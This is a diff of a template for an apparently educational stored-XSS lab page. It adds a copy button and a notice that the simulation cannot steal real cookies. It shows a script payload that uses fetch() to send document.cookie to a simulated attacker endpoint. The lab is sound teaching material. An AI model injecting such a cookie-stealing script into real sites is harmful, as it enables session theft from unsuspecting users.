@@ -7,8 +7,9 @@
         <title><%- title.title %> | <%- title.subtitle.xss %></title>
         <link rel="stylesheet" href="/styles/xss.css">
         <link rel="icon" type="image/x-icon" href="/images/favicon.ico">
-        <script src="/api/xss_fade.js"></script>
+        <script src="/api/fade.js"></script>
         <script src="/api/xss_stored_frame.js"></script>
+        <script src="/api/copy_code.js"></script>
     </head>
     <body class="body">
         <div class="page-wrapper">
@@ -44,7 +45,7 @@
                         <P>
                             In this lab, you will make permanent changes to the lab environment. If you want to reset the lab environment, click the button below:
                         </p>
-                        <button id='reset-button' class="button reverse" type="button">Reset</button>
+                        <button id='reset-button' class="button reverse" type="button">Reset environment</button>
                         <section id='reset-button-sec'>
                             <p id="usr-created-note" class="note" style="display:none"></p>
                             <button class="good" id="reset-hide-button" style="display:none" onclick="resetNotesClose()"></button>
@@ -70,7 +71,12 @@
                                         The code will extract the cookies from the victim's browser and send them to the attacker's server.
                                         Attcker's server is simulated by the lower iframe.
                                     </p>
-                                    <code id="post-code">
+                                    <p>
+                                        As this is only a educational simulation, the page will not contain the exploited comment, when
+                                        opened in another browser. So you do not even have to try to send the link to your friends. You won't get
+                                        their cookies!
+                                    </p>
+<code id="post-code">
 &lt;script&gt;
 fetch(
 '<%- full_url %>/frame_attacker',
@@ -79,8 +85,8 @@ fetch(
     body: JSON.stringify(document.cookie)
 });
 &lt;/script&gt;
-                                    </code><br/>
-                                    <!-- <button onclick="copyCode()">Copy code to clipboard</button> -->
+</code><br/>
+                                    <button onclick="copyCode('post-code')">Copy code to clipboard</button>
                                     <button class="reverse" onclick="fade(1)"> Next </button>
                                 </li>
                                 <li class="fadeMe" id="li_3" hidden>
